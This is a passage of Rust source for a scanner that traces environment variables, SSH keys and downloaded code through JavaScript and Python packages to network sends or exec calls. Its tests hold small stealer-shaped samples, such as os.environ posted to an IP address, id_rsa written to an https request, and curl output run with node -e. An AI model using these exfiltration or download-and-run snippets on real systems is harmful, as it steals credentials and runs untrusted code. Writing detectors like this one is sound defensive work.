                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth -= 1,
                _ => {}
            }
            depth < 0 || (depth == 0 && c == ',')
        };
        rest = &rest[rest.find(ends).unwrap_or(rest.len())..];
    }
    out + rest
}

/// Whether the method at byte `at` (its `.`) is called on a network client:
/// the library, a name bound to a client of it, or the call that makes one
/// (`https.request(o).end(body)`). `process.stdout.write(text)` and
/// `res.end(text)` send nothing out.
/// shortcut: a client that arrives as a parameter or from a helper of the
/// file is not seen; follow the bindings if a stealer passes its socket around.
fn on_client(text: &str, at: usize, cx: &Cx) -> bool {
    let head = text[..at].trim_end();
    let name = trailing_name(head);
    if name.is_empty() {
        // After a callback's block the call began in an earlier statement
        // (`https.request(o, () => {…}).end(body)`): not known, so it counts.
        let cut = head.matches(')').count() > head.matches('(').count();
        return head.ends_with(')') && (cut || cx.client.is_match(head));
    }
    let bound = |r: &String| {
        name.strip_prefix(r.as_str())
            .is_some_and(|rest| rest.is_empty() || rest.starts_with('.'))
    };
    ["requests", "httpx"].contains(&name) || cx.receivers.iter().any(bound)
}

/// The dotted name `head` ends with: `x = s.client` gives `s.client`. Sliced
/// one byte after the character in front of it, a `；` there (three bytes)
/// panicked, and the file kept one scanner-error finding for all its others.
fn trailing_name(head: &str) -> &str {
    let name = |c: char| c.is_alphanumeric() || "_$.".contains(c);
    &head[head.trim_end_matches(name).len()..]
}

/// Fills `cx.sink_funcs` and `cx.returns`: each function's statements are
/// walked alone, once as they are (does a `return` carry a secret or a
/// download) and once
/// per parameter with that parameter tainted (does it reach a network sink).
fn summarize(stmts: &[Stmt], funcs: &[Func], cx: &mut Cx) {
    let inside = |s: &Stmt, f: usize| {
        let mut at = s.func;
        while let Some(i) = at {
            if i == f {
                return true;
            }
            at = funcs[i].parent;
        }
        false
    };
    let call = |name: &str| {
        let name = regex::escape(name);
        Regex::new(&format!(r"(?:(?:^|[^\w$.])|(?:this|self)\.){name}\s*\(")).unwrap()
    };
    // What each function returns, none seeing another's summary: one level.
    // Two levels made `gethostbyname(get_podman_hostname())` a leak of the
    // environment a helper passes to `podman` (ansible-core).
    let returns: Vec<_> = funcs
        .iter()
        .enumerate()
        .filter_map(|(i, f)| {
            let body = stmts.iter().filter(|s| inside(s, i));
            let (kind, mut origin) = walk(body, &mut Taint::new(), cx).1?;
            origin.via_call = true;
            Some((f.name.clone(), call(&f.name), kind, origin))
        })
        .collect();
    cx.returns = returns;
    // Twice: the second round sees the wrappers the first one found.
    for _ in 0..2 {
        for (i, f) in funcs.iter().enumerate() {
            for (param, name) in f.params.iter().enumerate() {
                let known = cx
                    .sink_funcs
                    .iter()
                    .any(|s| s.name == f.name && s.param == param);
                if name.is_empty() || known {
                    continue;
                }
                // One parameter at a time: the walk stops at the first hit.
                let origin = Origin {
                    line: 0,
                    what: PARAM.to_string(),
                    alias: true,
                    via_call: false,
                };
                let mut taint = Taint::from([(name.clone(), (Kind::Secret, origin))]);
                let (hits, returned) = walk(stmts.iter().filter(|s| inside(s, i)), &mut taint, cx);
                if returned.is_some_and(|(_, origin)| origin.what.starts_with(PARAM))
                    && !cx.passers.contains(&f.name)
                {
                    cx.passers.push(f.name.clone());
                }
                if hits.iter().any(|h| h.origin.what.starts_with(PARAM)) {
                    cx.sink_funcs.push(SinkFunc {
                        call: call(&f.name),
                        name: f.name.clone(),
                        param,
                        param_name: name.clone(),
                    });
                }
            }
        }
    }
}

/// Arguments of a call, cut at top-level commas.
fn split_args(args: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let (mut depth, mut start) = (0i32, 0);
    let mut quote: Option<char> = None;
    let mut prev = '\0';
    for (i, c) in args.char_indices() {
        match quote {
            Some(q) => {
                if c == q && prev != '\\' {
                    quote = None;
                }
            }
            None => match c {
                '"' | '\'' | '`' => quote = Some(c),
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth -= 1,
                ',' if depth == 0 => {
                    out.push(&args[start..i]);
                    start = i + 1;
                }
                _ => {}
            },
        }
        prev = c;
    }
    out.push(&args[start..]);
    out
}

/// Whether `at` falls inside a string literal of `text`.
fn in_literal(text: &str, at: usize) -> bool {
    let (mut quote, mut escaped) = (None, false);
    for c in text[..at].chars() {
        match quote {
            Some(_) if escaped => escaped = false,
            Some(_) if c == '\\' => escaped = true,
            Some(q) if c == q => quote = None,
            Some(_) => {}
            None if matches!(c, '"' | '\'' | '`') => quote = Some(c),
            None => {}
        }
    }
    quote.is_some()
}

/// Parameter names by position. Python's `self` / `cls` are not arguments
/// of the call.
fn params(list: &str) -> Vec<String> {
    let names: Vec<String> = split_args(list)
        .into_iter()
        .map(|p| {
            let p = p.trim().trim_start_matches(['*', '.']);
            let end = p
                .find(|c: char| !(c.is_alphanumeric() || c == '_' || c == '$'))
                .unwrap_or(p.len());
            p[..end].to_string()
        })
        .collect();
    match names.first().map(String::as_str) {
        Some("self" | "cls") => names[1..].to_vec(),
        _ => names,
    }
}

fn flow(rel_path: &str, name: &str, origin: &Origin, line: usize, sink: &str) -> RuleMatch {
    let sink = sink.trim_start_matches(|c: char| !c.is_alphanumeric() && c != '.');
    RuleMatch {
        file_path: rel_path.to_string(),
        line_number: line,
        matched_pattern: name.to_string(),
        severity: "critical".to_string(),
        context: format!(
            "data flow: {} (line {}) reaches {}) (line {})",
            origin.what, origin.line, sink, line
        ),
    }
}

/// The taint `text` carries: a source in it, or a tainted name it mentions.
/// `want`: only that kind (a sink); `None`: any, secrets first (a binding).
/// A download source inside a sink's own arguments is the sink running
/// `curl -o file`, not running what came back, so sinks need a variable.
fn carried(
    text: &str,
    line: usize,
    taint: &Taint,
    want: Option<Kind>,
    cx: &Cx,
) -> Option<(Kind, Origin)> {
    let wants = |k: Kind| want.is_none_or(|w| w == k);
    let code = code_only(text);
    let found_in = mentions(&code);
    if wants(Kind::Secret) {
        // The environment itself, where it is not one variable of it or an
        // argument of some helper.
        let env = found_in.iter().find_map(|(name, mention, at)| {
            let alias = match (*mention, around(&code, *at, &cx.passers)) {
                (Mention::Pick, _) | (Mention::Bare, Around::Opaque) => return None,
                (Mention::Bare, Around::Top) => true,
                _ => false,
            };
            ["process.env", "os.environ"]
                .contains(&name.as_str())
                .then(|| (name.clone(), alias))
        });
        let path = || secret_path(text).map(|what| (what, false));
        if let Some((what, alias)) = env.or_else(path) {
            let via_call = false;
            return Some((
                Kind::Secret,
                Origin {
                    line,
                    what,
                    alias,
                    via_call,
                },
            ));
        }
    }
    if want.is_none() {
        // A call in the code, or `curl` / `wget` in a string. A `fetch(` inside
        // a string is a script for another process (`node -e`), not a call.
        let status = |m: &regex::Match| {
            let close = m.end() + call_args(&code, m.end() - 1).len();
            m.as_str().ends_with('(') && STATUS.is_match(code.get(close..).unwrap_or_default())
        };
        let call = DOWNLOAD_SRC.find(&code).filter(|m| !status(m));
        let call = call.map(|m| (m.as_str(), true));
        let found = call.or_else(|| {
            let m = DOWNLOAD_SRC.find(text)?;
            let word = m
                .as_str()
                .trim_start_matches(|c: char| !c.is_alphanumeric());
            // `cmd = 'curl -o f url'` is a command line: running `cmd` later
            // runs curl, not what curl fetched (ckan-cloud-operator). Only
            // the output of a call that runs it is a download.
            ((word.starts_with("curl") || word.starts_with("wget"))
                && RUNS_COMMAND.is_match(&text[..m.start()]))
            .then_some((m.as_str(), false))
        });
        if let Some((what, _)) = found {
            let what = what
                .trim_start_matches(|c: char| !c.is_alphanumeric())
                .to_string();
            let (alias, via_call) = (false, false);
            let origin = Origin {
                line,
                what,
                alias,
                via_call,
            };
            return Some((Kind::Download, origin));
        }
    }
    // Secrets first: a request built from a downloaded URL and a stolen
    // body carries the secret (env-loader-cli).
    let mut found: Vec<(Kind, Origin)> = cx
        .returns
        .iter()
        .filter(|(_, call, ..)| call.is_match(text))
        .map(|(_, _, kind, origin)| (*kind, origin.clone()))
        .collect();
    // A function of an imported file. The environment it returns counts
    // where a name holding it would: `getEnv().PORT` and `baseUrl(getEnv())`
    // are one setting. Stricter than for a function of this file, which
    // config modules do not export.
    found.extend(cx.imported.iter().filter_map(|(call, origin)| {
        let open = call.find(&code)?.end() - 1;
        let mut origin = origin.clone();
        if origin.alias {
            let after = open + call_args(&code, open).len() + 2;
            let outside = around(&code, open, &cx.passers);
            if outside == Around::Opaque || FIELD_READ.is_match(code.get(after..).unwrap_or("")) {
                return None;
            }
            origin.alias = outside == Around::Top;
        }
        Some((Kind::Secret, origin))
    }));
    found.extend(found_in.iter().filter_map(|(name, mention, at)| {
        let (kind, origin) = taint.get(name)?;
        if *kind == Kind::Download && STATUS.is_match(&code[at + name.len()..]) {
            return None;
        }
        // A path derived from the `.ssh` directory or a key's (`ssh_dir /
        // "config"`, `open(key + ".pub")`); a sink is not where it is built.
        let what = origin.what.to_ascii_lowercase();
        if want.is_none() && (what.contains(".ssh") || what.starts_with("id_")) && not_a_key(text) {
            return None;
        }
        let mut origin = origin.clone();
        if origin.alias {
            origin.alias = match (*mention, around(&code, *at, &cx.passers)) {
                (Mention::Pick, _) | (Mention::Bare, Around::Opaque) => return None,
                (Mention::Bare, Around::Top) => true,
                _ => false,
            };
        }
        Some((*kind, origin))
    }));
    found.retain(|(k, _)| wants(*k));
    let secret = found.iter().position(|(k, _)| *k == Kind::Secret);
    (!found.is_empty()).then(|| found.swap_remove(secret.unwrap_or(0)))
}

/// Calls whose result still holds what they were given, as text or a list:
/// the environment through `JSON.stringify` or `.items()` is the environment.
const SERIALISERS: &[&str] = &[
    "stringify",
    "dumps",
    "dump",
    "entries",
    "keys",
    "values",
    "items",
    "fromEntries",
    "str",
    "repr",
    "list",
    "tuple",
    "sorted",
    "urlencode",
    "quote",
    "encodeURIComponent",
    "encodeURI",
    "btoa",
    "b64encode",
    "from",
    "encode",
    "inspect",
    "String",
    "format",
    "join",
    "concat",
    "Buffer",
    "bytes",
    "toString",
    "serialize",
];
/// Calls that give back the same mapping again: a field read from
/// `dict(os.environ)` is still one variable.
const COPIERS: &[&str] = &[
    "dict",
    "copy",
    "deepcopy",
    "assign",
    "structuredClone",
    "cloneDeep",
    "merge",
];

/// What stands around a mention at byte `at` of code without its strings.
#[derive(Clone, Copy, PartialEq)]
enum Around {
    /// Nothing but literals and grouping: the value itself.
    Top,
    /// The argument of a call in `SERIALISERS`, or of a function of the file
    /// that returns what it was given.
    Serialiser,
    /// The argument of any other call: what comes back is not known to be
    /// the value (`baseUrl(env)`, `spawn(cmd, { env })`).
    Opaque,
}

/// What follows a value when one field of it is read: `[k]`, `?.k`, `.k`,
/// `.get(k)`; not a method call (`.items()`).
static FIELD_READ: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^\s*(?:\[|\?\.|\.(?:get|pop|setdefault|hasOwnProperty)\s*\(|\.[\w$]+\s*(?:[^\w$(\s]|$))",
    )
    .unwrap()
});

fn around(code: &str, at: usize, passers: &[String]) -> Around {
    let bytes = code.as_bytes();
    let mut depth = 0;
    let mut i = at.min(bytes.len());
    while i > 0 {
        i -= 1;
        match bytes[i] {
            b')' | b']' | b'}' => depth += 1,
            b'(' | b'[' | b'{' if depth > 0 => depth -= 1,
            b'(' => {
                let head = code[..i].trim_end();
                // `PROVIDERS[provider](env)`: a call, not a grouping.
                if head.ends_with([']', ')']) {
                    return Around::Opaque;
                }
                let callee = trailing_name(head).rsplit('.').next().unwrap_or_default();
                // Grouping, a keyword before the parenthesis or a copy of the
                // value: look further out.
                if callee.is_empty() || NOT_FUNCTIONS.contains(&callee) || COPIERS.contains(&callee)
                {
                    // `(options.env ?? process.env).NAME`: one variable of
                    // whichever mapping the group gives.
                    let close = i + call_args(code, i).len() + 2;
                    if FIELD_READ.is_match(code.get(close..).unwrap_or_default()) {
                        return Around::Opaque;
                    }
                    continue;
                }
                return if SERIALISERS.contains(&callee) || passers.iter().any(|p| p == callee) {
                    Around::Serialiser
                } else {
                    Around::Opaque
                };
            }
            _ => {}
        }
    }
    Around::Top
}

/// The end of a path in `~/.ssh` that is no secret (`join(dir, "config")`,
/// `key + ".pub"`, `~/.ssh/known_hosts`): a tool that makes a key and posts
/// the public half, or reads the host list. A name that is compared, not
/// read, does not count (`if name != "known_hosts"`).
static NOT_A_KEY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:[\w}]\.pub|\.ssh/config|/known_hosts|/authorized_keys)["'`]|[+,/]\s*["'](?:\.pub|config|known_hosts|authorized_keys)["']\s*(?:[).\]]|$)"#)
        .unwrap()
});
static LISTS_DIR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:listdir|readdir\w*|scandir|iterdir|glob|walk)\s*\(").unwrap());

/// The statement reads one of the files in `NOT_A_KEY` and does not list the
/// directory, where such a name is one to leave out.
fn not_a_key(text: &str) -> bool {
    NOT_A_KEY.is_match(text) && !LISTS_DIR.is_match(text)
}

/// A stealer-only path in the text, strings included.
fn secret_path(text: &str) -> Option<String> {
    // `~/.ssh/id_rsa.pub` is a public key: sent to be signed (unskript).
    SECRET_PATH
        .find_iter(text)
        .find(|m| {
            let quoted = m.as_str().starts_with(['"', '\'']);
            !(quoted && (text.contains(".pub\"") || text.contains(".pub'")))
                && !(m.as_str().contains(".ssh") && not_a_key(text))
                && !text[m.end()..]
                    .split(['"', '\'', '`'])
                    .next()
                    .unwrap_or_default()
                    .ends_with(".pub")
        })
        .map(|m| m.as_str().to_string())
}

/// The left side of an assignment that gives one name a new value (`x`,
/// `const x`, `self.x`, `x: Dict`), not `x +`, `x[k]`, `x.k` or `a, b`.
static PLAIN_LHS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^\s*(?:(?:export|const|let|var)\s+)*(?:self\.|this\.)?[A-Za-z_$][\w$]*\s*(?::[^=]*)?$",
    )
    .unwrap()
});

/// `(targets, right side, element, plain)` for each binding in one statement;
/// `element`: the targets are items of the right side (`for x in xs`), not it;
/// `plain`: the target is a name given a new value (see `PLAIN_LHS`).
fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool, bool)> {
    let mut out = Vec::new();
    if let Some((lhs, rhs)) = split_assignment(text) {
        // `const { HOME, CI } = process.env` picks variables, not the lot.
        let picks = lhs
            .trim()
            .trim_start_matches(|c: char| c.is_alphabetic() || c.is_whitespace())
            .starts_with('{');
        if !(picks && ["process.env", "os.environ"].contains(&rhs.trim().trim_end_matches(';'))) {
            out.push((targets(lhs), rhs, false, PLAIN_LHS.is_match(lhs)));
        }
    }
    let head = text.trim_start();
    if head.starts_with("with ") || head.starts_with("async with ") {
        for c in WITH_AS.captures_iter(text) {
            out.push((
                vec![c[2].to_string()],
                c.get(1).unwrap().as_str(),
                false,
                false,
            ));
        }
    }
    if let Some(c) = FOR_IN.captures(text) {
        out.push((
            targets(c.get(1).unwrap().as_str()),
            c.get(2).unwrap().as_str(),
            true,
            false,
        ));
    }
    if let Some(c) = THEN.captures(text) {
        out.push((
            vec![c[2].to_string()],
            c.get(1).unwrap().as_str(),
            false,
            false,
        ));
    }
    for c in MUTATE.captures_iter(text) {
        let target = base_name(&c[1]);
        if !NOT_VARIABLES.contains(&target.as_str()) {
            out.push((
                vec![target],
                call_args(text, c.get(0).unwrap().end() - 1),
                false,
                false,
            ));
        }
    }
    out
}

/// Left and right side of a top-level `=` (also `+=`, `|=`, ...), skipping
/// `==`, `<=`, `>=`, `!=` and `=>`.
fn split_assignment(text: &str) -> Option<(&str, &str)> {
    let b = text.as_bytes();
    let mut depth = 0i32;
    for i in 0..b.len() {
        match b[i] {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'=' if depth == 0 => {
                let next = b.get(i + 1).copied();
                let prev = if i > 0 { b[i - 1] } else { 0 };
                if next == Some(b'=')
                    || next == Some(b'>')
                    || matches!(prev, b'=' | b'<' | b'>' | b'!')
                {
                    continue;
                }
                return Some((&text[..i], &text[i + 1..]));
            }
            _ => {}
        }
    }
    None
}

/// Names a left side binds: `x`, `a, b`, `{a, b}`, `obj.k` / `obj[k]` (the
/// object), `self.k` / `this.k` (the attribute, not the whole object).
fn targets(lhs: &str) -> Vec<String> {
    let lhs = lhs
        .trim()
        .trim_end_matches(|c: char| "+-*/|&%^:".contains(c));
    let lhs = lhs.split(':').next().unwrap_or(lhs); // `x: Dict = ...`
    idents(lhs)
        .into_iter()
        .map(|n| base_name(&n))
        .filter(|n| !NOT_VARIABLES.contains(&n.as_str()))
        .collect()
}

/// Module and global objects: `os.environ.update(..)` or `sys.path.append(..)`
/// must not taint every later `os.` / `sys.` mention.
const NOT_VARIABLES: &[&str] = &[
    "os", "sys", "json", "re", "path", "process", "console", "Object", "JSON", "Math", "window",
    "document", "module", "exports", "require", "const", "let", "var", "global", "nonlocal",
    "export", "await", "return",
];

fn base_name(name: &str) -> String {
    match name.split_once('.') {
        Some(("self" | "this", _)) => name.to_string(),
        Some((base, _)) => base.to_string(),
        None => name.to_string(),
    }
}

/// Identifiers outside string literals, plus those inside f-string and
/// template interpolations. `self.x` / `this.x` stay dotted.
fn idents(text: &str) -> Vec<String> {
    mentions(&code_only(text))
        .into_iter()
        .map(|(name, ..)| name)
        .collect()
}

/// How an identifier is mentioned.
#[derive(Clone, Copy, PartialEq)]
enum Mention {
    /// The name itself.
    Bare,
    /// A method called on it (`x.encode()`, `x.items()`): something derived.
    Method,
    /// One field of it (`x.name`, `x[k]`, `x?.name`, `x.get(k)`), a test for
    /// one (`k in x`), or a call of it (`x()`).
    Pick,
}

/// `text` without the contents of its string literals; f-string and
/// template interpolations stay.
fn code_only(text: &str) -> String {
    let mut code = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let mut prev = ' ';
    while let Some(c) = chars.next() {
        if matches!(c, '"' | '\'' | '`') {
            let interpolates = c == '`' || matches!(prev, 'f' | 'F');
            let mut depth = 0;
            let mut escaped = false;
            for d in chars.by_ref() {
                if escaped {
                    escaped = false;
                } else if d == '\\' {
                    escaped = true;
                } else if depth == 0 && d == c {
                    break;
                } else if interpolates && d == '{' {
                    depth += 1;
                    code.push(' ');
                } else if interpolates && d == '}' && depth > 0 {
                    depth -= 1;
                    code.push(' ');
                } else if depth > 0 {
                    code.push(d);
                }
            }
            code.push(' ');
            prev = ' ';
            continue;
        }
        code.push(c);
        prev = c;
    }
    code
}

/// Each identifier of `code` (see `code_only`) with how it is mentioned and
/// where. `process.env` and `os.environ` come back under those names.
fn mentions(code: &str) -> Vec<(String, Mention, usize)> {
    let how = |member: Option<&str>, after: &str| match member {
        _ if after.starts_with('[') || after.starts_with("?.") => Mention::Pick,
        Some(m) if COPIERS.contains(&m) && after.starts_with('(') => Mention::Bare,
        Some(m) if !after.starts_with('(') || ["get", "pop", "setdefault"].contains(&m) => {
            Mention::Pick
        }
        Some(_) => Mention::Method,
        // `configDir()` after `configDir = (env = process.env) => root(env)`:
        // a name that is called is a function, not the value.
        None if after.starts_with('(') => Mention::Pick,
        None => Mention::Bare,
    };
    IDENT
        .find_iter(code)
        .map(|m| {
            let s = m.as_str();
            let after = code[m.end()..].trim_start();
            if matches!(s, "process.env" | "os.environ") {
                // `process.env.X`: the regex stops after one dot.
                let member = after.strip_prefix('.').map(|rest| {
                    let end = rest
                        .find(|c: char| !(c.is_alphanumeric() || c == '_' || c == '$'))
                        .unwrap_or(rest.len());
                    (&rest[..end], rest[end..].trim_start())
                });
                let mention = match member {
                    Some((name, rest)) => how(Some(name), rest),
                    None => how(None, after),
                };
                return (s.to_string(), mention, m.start());
            }
            match s.split_once('.') {
                Some(("self" | "this", _)) => (s.to_string(), how(None, after), m.start()),
                Some((base, member)) => (base.to_string(), how(Some(member), after), m.start()),
                None => (s.to_string(), how(None, after), m.start()),
            }
        })
        .collect()
}

/// The argument text of the call whose `(` is at byte `open`.
fn call_args(text: &str, open: usize) -> &str {
    let mut depth = 0i32;
    for (i, c) in text[open..].char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return &text[open + 1..open + i];
                }
            }
            _ => {}
        }
    }
    &text[(open + 1).min(text.len())..]
}

/// Statements with their first line, and the named functions they are in.
/// Strings and comments are kept out of the bracket count; a JS `{` after
/// `)`, `=>` or a keyword opens a block and separates statements instead of
/// continuing one. A Python function is its `def` and what is indented
/// under it.
fn statements(content: &str, python: bool) -> (Vec<Stmt>, Vec<Func>) {
    const MAX_STMT: usize = 8 * 1024;
    let mut out = Vec::new();
    let mut funcs: Vec<Func> = Vec::new();
    // Per open JS block, the function it is the body of.
    let mut scopes: Vec<Option<usize>> = Vec::new();
    let mut cur = String::new();
    let (mut line, mut start) = (1, 1);
    let mut depth = 0i32;
    // Bracket depth outside each open JS block.
    let mut blocks: Vec<i32> = Vec::new();
    let mut quote: Option<char> = None;
    let mut chars = content.chars().peekable();
    let mut prev = '\0';
    let flush = |cur: &mut String, out: &mut Vec<Stmt>, start: usize, func: Option<usize>| {
        if !cur.trim().is_empty() {
            out.push(Stmt {
                line: start,
                text: std::mem::take(cur),
                func,
                is_def: false,
            });
        }
        cur.clear();
    };
    let innermost = |scopes: &[Option<usize>]| scopes.iter().rev().flatten().next().copied();
    while let Some(c) = chars.next() {
        if c == '\n' {
            line += 1;
        }
        if let Some(q) = quote {
            cur.push(if c == '\n' { ' ' } else { c });
            if c == q && prev != '\\' || (c == '\n' && q != '`' && !python) {
                quote = None;
            }
            prev = if prev == '\\' && c == '\\' { '\0' } else { c };
            continue;
        }
        // Comments: `#` in Python, `//` and `/* */` in JS.
        if (python && c == '#') || (!python && c == '/' && chars.peek() == Some(&'/')) {
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                    if depth <= 0 {
                        flush(&mut cur, &mut out, start, innermost(&scopes));
                        start = line;
                    }
                    break;
                }
            }
            prev = '\n';
            continue;
        }
        if !python && c == '/' && chars.peek() == Some(&'*') {
            let mut last = '\0';
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                }
                if last == '*' && d == '/' {
                    break;
                }
                last = d;
            }
            continue;
        }
        match c {
            '"' | '\'' | '`' => {
                quote = Some(c);
                cur.push(c);
            }
            '{' if !python && is_block(&cur, depth) => {
                let opened = js_function(&cur).map(|(name, params)| {
                    funcs.push(Func {
                        name,
                        params,
                        parent: innermost(&scopes),
                    });
                    funcs.len() - 1
                });
                flush(&mut cur, &mut out, start, innermost(&scopes));
                if let (Some(_), Some(header)) = (opened, out.last_mut()) {
                    header.is_def = true;
                }
                start = line;
                blocks.push(depth);
                scopes.push(opened);
                depth = 0;
            }
            '}' if depth == 0 => {
                flush(&mut cur, &mut out, start, innermost(&scopes));
                start = line;
                depth = blocks.pop().unwrap_or(0);
                scopes.pop();
            }
            '(' | '[' | '{' => {
                depth += 1;
                cur.push(c);
            }
            ')' | ']' | '}' => {
                if depth > 0 {
                    depth -= 1;
                    cur.push(c);
                } else {
                    flush(&mut cur, &mut out, start, innermost(&scopes));
                    start = line;
                }
            }
            // `promise\n  .then(…)`: a line that starts with `.` goes on.
            '\n' if !python
                && depth <= 0
                && chars.clone().find(|c| !c.is_whitespace()) == Some('.') =>
            {
                cur.push(' ')
            }
            ';' | '\n' if depth <= 0 => {
                flush(&mut cur, &mut out, start, innermost(&scopes));
                start = line;
            }
            '\n' => cur.push(' '),
            _ => cur.push(c),
        }
        if cur.len() > MAX_STMT {
            flush(&mut cur, &mut out, start, innermost(&scopes));
            start = line;
            depth = 0;
        }
        prev = c;
    }
    flush(&mut cur, &mut out, start, innermost(&scopes));
    if python {
        // (indentation of the `def`, its function), innermost last.
        let mut open: Vec<(usize, usize)> = Vec::new();
        for s in &mut out {
            let indent = s.text.len() - s.text.trim_start().len();
            while open.last().is_some_and(|&(i, _)| indent <= i) {
                open.pop();
            }
            s.func = open.last().map(|&(_, f)| f);
            if let Some(c) = PY_DEF.captures(&s.text) {
                funcs.push(Func {
                    name: c[1].to_string(),
                    params: params(&c[2]),
                    parent: s.func,
                });
                s.is_def = true;
                open.push((indent, funcs.len() - 1));
            }
        }
    }
    (out, funcs)
}

/// Name and parameters when the text before a block's `{` is a named
/// function's header.
fn js_function(before: &str) -> Option<(String, Vec<String>)> {
    if let Some(c) = TS_ASYNC.captures(before) {
        let list = if c[3].trim().is_empty() { &c[2] } else { &c[3] };
        return Some((c[1].to_string(), params(list)));
    }
    let c = JS_FUNC.captures(before)?;
    let (name, list) = [(1, 2), (3, 4), (5, 6), (7, 8)]
        .into_iter()
        .find_map(|(n, p)| Some((c.get(n)?.as_str(), c.get(p)?.as_str())))?;
    (!NOT_FUNCTIONS.contains(&name)).then(|| (name.to_string(), params(list)))
}

/// A JS `{` that opens a block (function body, `if`, `try`) rather than an
/// object literal. `depth`: brackets open in the statement; inside them a
/// `{` after `=` is a default value (`function f(a = {}, env = process.env)`),
/// which used to cut the header in two and bind `env` to the environment.
/// So is the `{}` of `onText = () => {}` there; a callback's `=> {` among the
/// arguments of a call still opens a block.
fn is_block(before: &str, depth: i32) -> bool {
    let t = before.trim_end();
    t.is_empty()
        || t.ends_with(')')
        || (t.ends_with("=>") && !(depth > 0 && DEFAULT_ARROW.is_match(t)))
        || ["else", "try", "finally", "do"]
            .iter()
            .any(|k| t.ends_with(k))
        || (depth == 0
            && t.split_whitespace()
                .next()
                .is_some_and(|w| ["class", "function", "async"].contains(&w)))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(path: &str, src: &str) -> Vec<String> {
        flows(path, src)
            .into_iter()
            .map(|m| m.matched_pattern)
            .collect()
    }

    #[test]
    fn environment_reaching_a_request_through_a_dict() {
        let src = r#"import os, json, urllib.request
def main():
    env_vars = os.environ
    data = {
        "host": "x",
        "env": dict(env_vars),
    }
    data.update({"kube": None})
    data_json = json.dumps(data).encode('utf-8')
    req = urllib.request.Request("http://198.51.100.23:8090/x", data=data_json)
    with urllib.request.urlopen(req) as response:
        response.read()
"#;
        let found = flows("pkg/__init__.py", src);
        assert_eq!(
            found.len(),
            1,
            "{:?}",
            found.iter().map(|m| &m.context).collect::<Vec<_>>()
        );
        assert_eq!(found[0].matched_pattern, CREDENTIAL_EXFIL);
        assert_eq!(found[0].line_number, 11);
        assert!(
            found[0].context.contains("os.environ (line 3)"),
            "{}",
            found[0].context
        );
    }

    #[test]
    fn downloaded_code_reaching_exec_or_node() {
        let py = "from urllib import request\nreq = request.Request(url)\nwith request.urlopen(req, timeout=10) as resp:\n    exec(resp.read(), mod.__dict__)\n";
        assert_eq!(names("m/__init__.py", py), vec![DOWNLOAD_EXECUTE]);
        let curl = "r = subprocess.run(['curl', '-s', 'https://x.github.io/p.js'], capture_output=True, text=True)\nif r.returncode == 0:\n    subprocess.run(['node', '-e', r.stdout], timeout=30)\n";
        assert_eq!(names("w/__init__.py", curl), vec![DOWNLOAD_EXECUTE]);
        let js = "async function go() {\n  const res = await fetch(u);\n  const code = await res.text();\n  new Function(code)();\n}\n";
        assert_eq!(names("index.js", js), vec![DOWNLOAD_EXECUTE]);
    }

    #[test]
    fn ssh_key_written_to_a_raw_https_request() {
        let js = "const https = require('https');\nconst key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nconst body = JSON.stringify({ k: key });\nconst req = https.request(opts, () => {});\nreq.write(body);\nreq.end();\n";
        assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn a_wrapper_around_the_sink_is_a_sink() {
        // strapi-plugin-hextest (dev): `send(tag, data)` writes `data` to a
        // raw request; the callers hold the secrets. Called before defined.
        let js = "const http = require('http');\nsend('env', JSON.stringify(process.env));\n\
                  function send(tag, data) {\n  const req = http.request({ host: H, path: '/x/' + tag, method: 'POST' }, () => {});\n  req.write(data);\n  req.end();\n}\n";
        let found = flows("postinstall.js", js);
        assert_eq!(
            found.len(),
            1,
            "{:?}",
            found.iter().map(|m| &m.context).collect::<Vec<_>>()
        );
        assert_eq!(
            (found[0].matched_pattern.as_str(), found[0].line_number),
            (CREDENTIAL_EXFIL, 2)
        );
        // Derived values keep the whole: a chunk of a parameter's text.
        let chunks = "const http = require('http');\nfunction send(tag, data) {\n  const body = typeof data === 'string' ? data : JSON.stringify(data);\n  const chunks = [];\n  chunks.push(body.substring(0, 5000));\n  const chunk = chunks[0];\n  const req = http.request({ host: H, method: 'POST' });\n  req.write(chunk);\n  req.end();\n}\nsend('keys', run('cat /root/.ssh/id_rsa'));\n";
        assert_eq!(names("postinstall.js", chunks), vec![CREDENTIAL_EXFIL]);
        // A wrapper around the wrapper, and an arrow function.
        let two = "const post = async (body) => {\n  await fetch(URL, { method: 'POST', body });\n};\n\
                   function report(what) {\n  post(JSON.stringify(what));\n}\nreport(process.env);\n";
        assert_eq!(names("index.js", two), vec![CREDENTIAL_EXFIL]);
        let py = "import os, requests\nclass C:\n    def send(self, data):\n        requests.post(URL, json=data)\n\n    def run(self):\n        self.send(data=dict(os.environ))\n";
        assert_eq!(names("pkg/__init__.py", py), vec![CREDENTIAL_EXFIL]);
    }

    #[test]
    fn compiled_typescript_stealer_through_a_promise_chain() {
        // The shape of prettier-logger (dev): tsc output, a file read by one
        // function and posted by another, joined by `.then`.
        let js = "const m73 = () => __awaiter(void 0, void 0, void 0, function* () {\n    const o75 = path_1.default.join(os_1.default.homedir(), '.ssh', 'id_ed25519');\n    const p76 = yield fs_1.default.promises.readFile(o75, 'utf8');\n    return p76;\n});\n\
                  const n77 = (q78, t81) => __awaiter(void 0, void 0, void 0, function* () {\n    yield fetch(`${u83}/api/validate/project-env`, {\n        method: 'POST',\n        body: JSON.stringify({ operatingSystem: q78, envContent: t81 }),\n    });\n});\n\
                  m73()\n    .then((v83) => __awaiter(void 0, void 0, void 0, function* () {\n    if (v83 !== null) {\n        yield n77(o15.operatingSystem, v83);\n    }\n}))\n    .catch((e) => { });\n";
